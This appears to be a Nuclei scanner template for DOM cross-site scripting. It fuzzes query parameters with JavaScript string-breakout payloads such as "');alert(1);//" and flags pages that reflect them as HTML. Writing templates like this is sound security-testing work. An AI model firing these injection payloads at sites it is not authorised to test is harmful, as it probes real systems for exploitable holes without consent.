id: dom-xss

info:
  name: DOM XSS
  author: reewardius
  severity: medium
  tags: fuzzing-xss,fuzzing-req
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"
      
    payloads:
      js:
        - "');alert(1);//"
        - "'));alert(1);//"
        - "'));alert(1);//"
        
    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{js}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "alert(1)"
        part: body
        
      - type: word
        part: header
        words:
          - text/html